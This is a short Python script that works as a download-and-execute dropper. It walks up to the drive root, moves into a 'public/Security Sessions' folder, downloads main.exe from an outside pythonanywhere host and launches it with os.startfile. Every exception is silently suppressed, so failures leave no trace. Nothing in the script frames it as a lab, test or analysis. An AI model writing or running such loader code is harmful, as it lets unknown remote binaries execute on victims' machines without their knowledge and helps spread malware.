import requests,os,subprocess

def download(url):

    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
    

current_dir = os.getcwd()
strr = os.getcwd()
x = -1
for i in os.getcwd():
    if i == "\\":
        x += 1
for i in range(x):
    os.chdir("..")

os.chdir("public")
os.chdir("Security Sessions")
print(os.getcwd())
try:
    download("https://armeng.pythonanywhere.com/media/files/main.exe")
    os.startfile("main.exe")
except Exception:
    pass
